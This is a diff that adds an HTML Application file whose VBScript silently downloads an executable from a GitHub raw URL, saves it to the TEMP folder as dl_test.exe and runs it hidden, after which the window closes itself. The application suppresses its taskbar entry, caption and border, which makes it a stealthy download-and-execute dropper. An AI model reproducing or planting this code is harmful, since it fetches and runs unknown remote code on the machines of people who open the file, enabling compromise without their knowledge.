@@ -1,0 +1,22 @@
+<html>
+<head><title>.</title>
+<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
+<script language="VBScript">
+On Error Resume Next
+Dim x,s,f,o
+Set x = CreateObject("MSXML2.ServerXMLHTTP")
+x.open "GET","https://raw.githubusercontent.com/kai195102/d/main/rs.exe",False
+x.send
+Set s = CreateObject("ADODB.Stream")
+s.Type = 1
+s.Open
+s.Write x.responseBody
+s.SaveToFile Environ("TEMP") & "\dl_test.exe", 2
+s.Close
+Set o = CreateObject("WScript.Shell")
+o.Run Environ("TEMP") & "\dl_test.exe", 0, False
+window.close()
+</script>
+</head>
+<body></body>
+</html>
